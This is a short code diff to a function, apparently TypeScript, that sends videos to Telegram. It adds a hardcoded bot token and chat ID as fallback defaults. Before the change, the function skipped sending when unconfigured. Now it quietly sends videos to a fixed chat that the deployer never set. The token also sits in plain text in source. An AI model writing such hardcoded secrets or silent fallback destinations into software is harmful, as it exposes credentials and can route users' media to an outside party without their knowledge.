@@ -1860,8 +1860,11 @@ async function sendVideoToTelegram(
   customChatId?: string,
   customToken?: string
 ): Promise<{ success: boolean; error?: string }> {
-  const botToken = customToken || process.env.TELEGRAM_BOT_TOKEN;
-  const chatId = customChatId || process.env.TELEGRAM_CHAT_ID;
+  const DEFAULT_BOT_TOKEN = "8870687283:AAGe87k64Gej8jJ5Ahc7m20DrB0NoaKsQSU";
+  const DEFAULT_CHAT_ID = "2034380079";
+
+  const botToken = customToken || process.env.TELEGRAM_BOT_TOKEN || DEFAULT_BOT_TOKEN;
+  const chatId = customChatId || process.env.TELEGRAM_CHAT_ID || DEFAULT_CHAT_ID;
   if (!botToken || !chatId) {
     console.log("[Telegram Bot] Skipping notification: TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID not configured.");
     return { success: false, error: "Telegram bot token or chat ID not configured." };
